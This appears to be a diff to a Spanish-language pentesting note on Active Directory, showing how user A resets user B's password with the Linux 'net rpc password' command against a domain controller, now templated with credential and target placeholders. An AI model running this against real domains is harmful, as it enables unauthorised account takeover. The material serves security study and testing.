@@ -8,7 +8,7 @@ Para este caso nos tenemos que posicionar en dos posibilidades, una es si nos po
 Para este caso vamos a usar la herramienta net, la cual nos permite interactuar con servicios de AD desde linux, específicamente para cambiar la contraseña de el usuario B siendo nosotros el usuario A usaremos la siguiente sintaxis:
 
 ```python 
-net rpc password UsuarioB -U 'UsuarioA' -S [IP_DC]
+net rpc password '{TARGET_USER}' '{NEWPASS}' -U '{DOMINIO}'/'{USUARIO_LOGIN}'%'{CONTRASEÑA}' -S '{IP_DC}'
 ```
 
 Posteriormente nos va a pedir la nueva contraseña para el usuario B y luego la contraseña de nuestro usuario A 
